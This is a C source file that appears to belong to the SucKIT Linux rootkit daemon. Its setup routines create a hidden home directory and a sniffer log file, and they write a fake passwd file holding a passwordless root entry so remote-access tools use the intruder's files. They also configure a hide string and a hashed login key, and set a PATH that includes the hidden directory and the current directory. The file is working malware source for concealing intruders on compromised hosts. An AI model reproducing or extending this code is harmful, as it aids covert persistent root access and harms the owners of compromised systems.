/*
 * $Id: skd.c, various helper stuff for suckit daemon
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <sys/un.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/poll.h>


#include "sktypes.h"
#include "skd.h"
#include "setup.h"
#include "skauth.h"
#include "sha1.h"
#include "config.h"
#include "aux.h"
#include "sk.h"
#include "rc4.h"
#include "crypto.h"
#include "login.h"
#include "hard.h"

/*
struct	timef {
	struct	timef *next;
	time_t	a_time;
	time_t	m_time;
}

struct	timef *save_time(char *tree)
{
	struct	timef *t, **i;
	char	*p = tree;
	
	for (i = &t;; i = &i->next) {
		char	subdir[1024], *s = subdir;

		if ((*p == '/'))
			p++;
		while ((*p != '/') && (p != '\0'))
			*s = *p;
		*s = 0;
		
	}
}
*/

static	int mkdirp(char *p, int mode)
{
	char buf[512];
	char *b = buf;
	int	ret;

	while (*p) {
		while (1) {
			*b++ = *p;
			if ((*p == 0) || (*p == '/')) {
				p++;
				break;
			}
			p++;
		}
		*b = 0;
		ret = mkdir(buf, mode);
		if ((ret < 0) && (errno != EEXIST))
			return 1;
	}
	return 0;
}
int skd_dirs(void)
{
	int	um = umask(0);
	char	buf[512];
	int	fd;

	if (mkdirp(cfg.home, 0700))
		return 1;
	snprintf(buf, sizeof(buf), "%s/%s", cfg.home, SNIFFER);
	close(open(buf, O_CREAT|O_WRONLY, 0222));

	/* fake passwd with _our_ home for things like ssh(1)
	 * (i.e. no longer your known_hosts in real root's home) */
	snprintf(buf, sizeof(buf), "%s/%s", cfg.home, PWDHACK);
	fd = creat(buf, 0600);
	write(fd, buf, sprintf(buf, "root::0:0::%s:/bin/bash\n", cfg.home));
	close(fd);

	umask(um);
	return 0;
}

extern	char *ebuf1, *ebuf2;

static	void skd_initenv()
{
	sprintf(ebuf1, "HOME=%s", cfg.home);
	sprintf(ebuf2,
	"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:"
	"/usr/local/sbin:%s:%s/bin:.", cfg.home, cfg.home);
}

extern	int hlen;
extern	char lkey[];

static	void skd_init_kernel()
{
	hlen = strlen(cfg.hidestr);
	sha1_asm(lkey, cfg.hashpass, 20);
}

/*
 * This does all that odd suckitd stuff
 */
void	skd_init(void)
{
	skd_init_kernel();
	skd_dirs();
	skd_initenv();
}
